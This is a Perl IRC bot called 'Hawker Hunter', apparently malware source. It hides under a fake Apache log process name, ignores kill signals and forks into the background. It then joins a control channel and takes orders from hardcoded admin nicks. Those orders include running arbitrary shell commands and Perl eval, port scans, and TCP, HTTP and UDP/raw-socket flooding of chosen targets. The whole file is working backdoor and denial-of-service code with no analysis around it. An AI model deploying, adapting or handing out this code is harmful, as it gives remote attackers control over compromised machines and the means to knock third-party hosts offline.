#!/usr/bin/perl
####################################################
# Hawker Hunter v2.0 (ARZ Co. Ltd.) Legacy 2009(c) #
####################################################

#############CONF###################################
my $hidden = '/usr/sbin/apache/log';
my $linas_max='4';
my $sleep='5';
my @admins=("WinD3str0y","WinD3str0y");
my @hostauth=("WinD3str0y.users.quakenet.org","WinD3str0y.users.quakenet.org");
my @channels=("#WiND3str0y");
my $nick='bombnc';
my $ircname ='kizdadata';
my $realname = 'ai bnc';
my $server='multiplay.uk.quakenet.org';
my $port='6667';
####################################################
###########theRe we Go##############################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$0="$hidden"."\0"x16;;
my $pid=fork;
exit if $pid;
die "fork problem: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();

$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $server_con = $_[1];
   my $port_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server_con", PeerPort=>$port_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$server_con";
     $irc_servers{$IRC_cur_socket}{'port'} = "$port_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $server_con :$realname");
     sleep 1;
   }
}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$server", "$port"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}
 
sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.16 Khaled Mardam-Bey\001");
       }
       if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
       if (grep {$_ =~ /^\Q$pn\E$/i } @admins) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         if ($args =~ /^(\Q$meunick\E|\!zax)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "!bot" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         } 
       }
	}
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4; 
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       nick("$meunick-".int rand(999999));
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $channel (@channels) {
         sendraw("JOIN $channel hawker");
       }
   }
}


sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^portscan (.*)/) {
             my $hostip="$1";
             my @ports=("21","22","23","25","80","113","135","443","445","5900","5901","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","1080");
             my (@aberta, %port_banner);
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR] 3Scanning4 ".$1." for open ports.");
             foreach my $port (@ports)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $port, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $port);
                   $scansock->close;
                }
             }

             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR] 3Open port(s)4: @aberta");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :[2hawkeR hunteR]3 No open ports found4!");
             }
           }
           if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
 sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 TCP Attacking4 ".$1.":".$2." 3for4 ".$3." 3seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($3>$cur_time){
             $cur_time = time - $itime;
	     &tcpflooder("$1","$2","$3");
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 TCP Attack done 4".$1.":".$2.".");
           }

           if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 HTTP Attacking4 ".$1." 3for4 ".$2." 3seconds.");
	     my $itime = time;
	     my ($cur_time);
             $cur_time = time - $itime;
	     while ($2>$cur_time){
             $cur_time = time - $itime;
	     my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
             print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
	     close($socket);
             }
	     sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3HTTP Attacking done ".$1.".");
           }
##########UDP-1#############################################
           if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 UDP Attacking4 ".$1." 3with4 ".$2." 3KB(s) for4 ".$3." 3seconds.");
             my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
             sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 UDP Sent4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 3Kb in4 ".$dtime." 3seconds to ".$1.".");
           }
##########UDP-2#############################################
           if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)\s+(\d+)/) {
             sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 UDP2 Attacking4 ".$1.":".$4." 3with4 ".$2." 3KB(s) for4 ".$3." 3seconds.");
             my ($dtime, %pacotes) = udpflooder2("$1", "$2", "$3","$4");
             $dtime = 1 if $dtime == 0;
             my %bytes;
             $bytes{igmp} = $2 * $pacotes{igmp};
             $bytes{icmp} = $2 * $pacotes{icmp};
             $bytes{o} = $2 * $pacotes{o};
             $bytes{udp} = $2 * $pacotes{udp};
             $bytes{tcp} = $2 * $pacotes{tcp};
             sendraw($IRC_cur_socket, "PRIVMSG $printl :[2hawkeR hunteR]3 UDP Sent4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 3Kb in4 ".$dtime." 3seconds to ".$1.".");
           }
############################################################
           exit;
       }
  }
}
 
sub ircase {
  my ($kem, $printl, $case) = @_;

  if ($case =~ /^join (.*)/) {
     j("$1");
   } 
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
   if ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   if ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   if ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   if ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   if ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   if ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   if ($case =~ /^eval (.*)/) {
     eval "$1";
   }
}

sub shell {
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "No such file or directory");
    return;
  } 
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c == "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}

sub tcpflooder {
 my $itime = time;
 my ($cur_time);
 my ($ia,$pa,$proto,$j,$l,$t);
 $ia=inet_aton($_[0]);
 $pa=sockaddr_in($_[1],$ia);
 $ftime=$_[2];
 $proto=getprotobyname('tcp');
 $j=0;$l=0;
 $cur_time = time - $itime;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  socket($t,PF_INET,SOCK_STREAM,$proto);
  connect($t,$pa)||$j--;
  $j++;$l++;
 }
 $l=0;
 while ($l<1000){
  $cur_time = time - $itime;
  last if $cur_time >= $ftime;
  $t="SOCK$l";
  shutdown($t,2);
  $l++;
 }
}

sub udpflooder {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
  
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $port = 1; $port <= 65000; $port++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

sub udpflooder2 {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'A' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my $udpport = $_[3];
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
  
  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($udpport, $iaddr)) and $pacotes{igmp}++;
       send(SOCK2, $msg, 0, sockaddr_in($udpport, $iaddr)) and $pacotes{udp}++;
       send(SOCK3, $msg, 0, sockaddr_in($udpport, $iaddr)) and $pacotes{icmp}++;
       send(SOCK4, $msg, 0, sockaddr_in($udpport, $iaddr)) and $pacotes{tcp}++;

       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($udpport, $iaddr)) and $pacotes{o}++;
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}  
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {
  sendraw("PART $_[0]");
}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
}



